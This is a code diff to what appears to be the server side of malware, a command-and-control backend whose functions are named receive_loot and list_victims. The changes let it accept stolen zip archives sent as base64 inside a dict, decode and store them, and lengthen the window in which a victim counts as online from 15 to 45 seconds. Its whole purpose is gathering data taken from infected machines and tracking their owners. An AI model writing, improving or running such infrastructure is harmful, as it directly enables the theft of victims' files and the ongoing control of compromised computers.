@@ -446,7 +446,10 @@ def receive_loot():
         except Exception:
             (loot_dir / f"{filename}.json").write_text(json.dumps({"data": content[:500]}), encoding="utf-8")
             entry["file"] = f"{filename}.json"
-    elif loot_type == "steal_zip" and isinstance(content, str) and len(content) > 100:
+    elif loot_type == "steal_zip" and isinstance(content, dict) and content.get("zip_b64"):
+        content = content.get("zip_b64")
+        loot_type = "steal_zip"
+    if loot_type == "steal_zip" and isinstance(content, str) and len(content) > 100:
         try:
             import zipfile, io
             raw = base64.b64decode(content)
@@ -563,7 +566,7 @@ def list_victims():
                         continue
             last = v.get("last_seen") or ""
             try:
-                online = (datetime.utcnow() - datetime.fromisoformat(last.replace("Z", ""))).total_seconds() < 15
+                online = (datetime.utcnow() - datetime.fromisoformat(last.replace("Z", ""))).total_seconds() < 45
             except Exception:
                 online = False
             out.append({"vid": vid, "info": v.get("info") or {}, "last_seen": last, "online": online,
